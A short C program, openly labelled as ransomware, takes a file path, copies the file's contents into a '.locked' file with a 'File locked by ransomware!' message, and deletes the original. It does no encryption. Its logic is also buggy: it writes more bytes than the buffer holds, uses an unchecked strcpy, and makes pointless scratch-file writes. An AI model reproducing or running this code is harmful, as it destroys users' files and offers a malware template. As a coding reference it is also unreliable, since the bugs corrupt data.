#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

void ransomware(const char *file_path) {
    // Get the directory and filename
    char directory[256];
    strcpy(directory, file_path);
    char *filename = strrchr(directory, '/');
    if (filename == NULL) {
        fprintf(stderr, "Invalid file path\n");
        exit(EXIT_FAILURE);
    }
    *filename = '\0';
    filename++;

    // Open file x
    char x_path[500];
    sprintf(x_path, "%s/x", directory);
    int x_fd = open(x_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (x_fd == -1) {
        perror("open");
        exit(EXIT_FAILURE);
    }
    const char *x_content = "This is the x file\n";
    if (write(x_fd, x_content, strlen(x_content)) == -1) {
        perror("write");
        close(x_fd);
        exit(EXIT_FAILURE);
    }

    // Create file c
    char c_path[500];
    sprintf(c_path, "%s/c", directory);
    int c_fd = open(c_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (c_fd == -1) {
        perror("open");
        exit(EXIT_FAILURE);
    }
    const char *c_content = "This is the c file\n";
    if (write(c_fd, c_content, strlen(c_content)) == -1) {
        perror("write");
        close(c_fd);
        exit(EXIT_FAILURE);
    }

    // Open the original file
    int original_fd = open(file_path, O_RDONLY);
    if (original_fd == -1) {
        perror("open");
        exit(EXIT_FAILURE);
    }
    close(c_fd);
    // Read the content of the original file
    char buffer[BUFSIZ];
    ssize_t bytes_read;
    size_t file_content_size = 0;
    while ((bytes_read = read(original_fd, buffer, BUFSIZ)) > 0) {
        file_content_size += bytes_read;
    }
    if (bytes_read == -1) {
        perror("read");
        close(original_fd);
        exit(EXIT_FAILURE);
    }
    if (unlink(c_path) == -1) {
        perror("unlink");
        exit(EXIT_FAILURE);
    }
    // Create a locked file
    char locked_file_path[500];
    sprintf(locked_file_path, "%s/%s.locked", directory, filename);
    int locked_fd = open(locked_file_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (locked_fd == -1) {
        perror("open");
        close(original_fd);
        exit(EXIT_FAILURE);
    }
    if (write(x_fd, x_content, strlen(x_content)) == -1) {
        perror("write");
        close(x_fd);
        exit(EXIT_FAILURE);
    }
    if (write(locked_fd, buffer, file_content_size) == -1) {
        perror("write");
        close(original_fd);
        close(locked_fd);
        exit(EXIT_FAILURE);
    }
    close(x_fd);
    if (write(locked_fd, "\nFile locked by ransomware!\n", strlen("\nFile locked by ransomware!\n")) == -1) {
        perror("write");
        close(original_fd);
        close(locked_fd);
        exit(EXIT_FAILURE);
    }
    close(original_fd);
    close(locked_fd);
    // Delete the x file
    if (unlink(x_path) == -1) {
        perror("unlink");
        exit(EXIT_FAILURE);
    }

    // Delete the original file
    if (unlink(file_path) == -1) {
        perror("unlink");
        exit(EXIT_FAILURE);
    }
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <file_path>\n", argv[0]);
        return EXIT_FAILURE;
    }

    ransomware(argv[1]);
    return EXIT_SUCCESS;
}
